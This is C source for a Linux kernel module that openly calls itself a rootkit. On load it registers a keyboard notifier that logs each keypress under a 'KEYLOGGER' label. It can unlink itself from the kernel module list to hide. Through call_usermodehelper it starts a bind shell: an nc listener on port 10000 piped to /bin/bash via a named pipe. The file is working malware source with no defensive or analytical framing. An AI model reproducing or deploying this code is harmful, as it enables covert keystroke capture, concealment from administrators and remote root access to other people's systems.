#ifndef __KERNEL__
#define __KERNEL__
#endif
#ifndef MODULE
#define MODULE
#endif

#define LOG
/*#define HIDE*/

#include <linux/kernel.h>
#include <linux/module.h>
#include <linux/string.h>
#include <linux/keyboard.h>

/* PROTO */

int keyboard_hook(struct notifier_block *, unsigned long code, void *);

/* DATA */

static struct notifier_block nb = {
  .notifier_call = keyboard_hook
};

struct list_head * new_head;

/* FUNCTIONALITY */

int keyboard_hook(struct notifier_block *nblock, unsigned long code, void *_param) {
	struct keyboard_notifier_param *param = _param;
	//struct vc_data *vc = param->vc;

#ifdef LOG
	if (code == KBD_KEYCODE && param->down) printk(KERN_DEBUG "KEYLOGGER %i down\n", param->value);
#endif

	return NOTIFY_OK;
}

void hide_module(void){
	new_head=__this_module.list.next;
	//if (!list_empty(head))
	//	list_del(head->next);

	list_del(&(__this_module.list));

}

void unhide_module(void){
	list_add(&(__this_module.list), new_head);
}

static void start_shell(void){
//perl -e ''
//mknod .bp p && nc -l 10000 0<.bp | /bin/bash 1>.bp
	char *argv[] = { "/usr/bin/perl", "-e", "\'system(\"rm .bp && mknod .bp p && nc -l 10000 0<.bp | /bin/bash 1>.bp\")\'", NULL};
	static char *envp[] =   { "HOME=/", "PATH=/sbin:/system/sbin:/system/bin:/system/xbin", NULL };
	int rt=call_usermodehelper (argv[0], argv, envp, 1);

#ifdef LOG
	printk(KERN_DEBUG "Start shell %i %s \n", rt, argv[2]);
#endif
}

/*BOOTSTRAPING*/

static int __init rootkit_start(void){
#ifdef HIDE	
	hide_module();
#endif
	//unhide_module();
	start_shell();
	register_keyboard_notifier(&nb);
	return 0;
}

static void __exit rootkit_end(void){
	unregister_keyboard_notifier(&nb);
}

module_init(rootkit_start);
module_exit(rootkit_end);

MODULE_LICENSE("GPL");
